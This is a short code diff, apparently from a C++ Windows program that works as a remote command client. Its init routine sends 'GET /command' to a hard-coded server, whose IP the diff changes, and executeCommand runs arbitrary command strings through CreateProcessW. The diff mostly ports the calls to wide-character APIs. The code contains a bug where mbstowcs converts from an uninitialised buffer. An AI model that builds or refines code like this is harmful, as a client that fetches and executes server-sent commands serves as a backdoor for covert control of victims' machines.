@@ -38,15 +38,15 @@ void pr_error() {
     char buffer[32];
     wchar_t wtext[20];
     mbstowcs(wtext, buffer, strlen(buffer) + 1);
-    wsprintf(wtext, L"%d", lserr);
+    swprintf(wtext, sizeof(wtext)/sizeof(wchar_t), L"%d", lserr);
 
-    MessageBox(NULL, wtext, L"test", MB_OK);
+    MessageBoxW(NULL, wtext, L"test", MB_OK);
     return;
 }
 void executeCommand(const std::string& command) {
     /*system(command.c_str());*/
 
-    STARTUPINFO si;
+    STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
@@ -58,7 +58,7 @@ void executeCommand(const std::string& command) {
     std::wstring wcommand(command.begin(), command.end());
 
     
-    if (!CreateProcess(NULL, &wcommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+    if (!CreateProcessW(NULL, &wcommand[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         pr_error();
         return;
     }
@@ -76,7 +76,7 @@ void init() {
     struct sockaddr_in serverAddress;
 
 
-    const char* serverIp = "192.168.178.67";
+    const char* serverIp = "192.168.178.51";
     const char* sendbuf = "GET /command HTTP/1.1\r\n"
         "Host: www.growlser.com\r\n"
         "Connection: close\r\n\r\n";
